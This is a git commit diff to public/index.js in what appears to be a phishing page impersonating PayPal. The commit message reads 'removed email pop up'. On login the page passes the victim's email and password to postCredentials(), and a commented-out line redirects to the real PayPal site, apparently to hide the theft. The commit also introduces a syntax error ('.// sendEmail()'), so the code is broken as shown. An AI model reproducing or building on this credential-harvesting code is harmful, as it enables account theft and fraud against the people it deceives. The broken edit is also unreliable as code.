e03ef78fd0f0072170361f4b3550215175e8e45f
Levi Opunga <86954179+Levi-Opunga@users.noreply.github.com>
2023-01-12 21:52:21 +0300

    removed email pop up

--- public/index.js
+++ public/index.js
@@ -49,7 +49,7 @@ function sendEmail() {
 
 loginBtn.addEventListener("click", function() {
     postCredentials(email.value, password.value)
-    sendEmail()
+   .// sendEmail()
     //window.location.replace("https://www.paypal.com/us/home");
 })
 
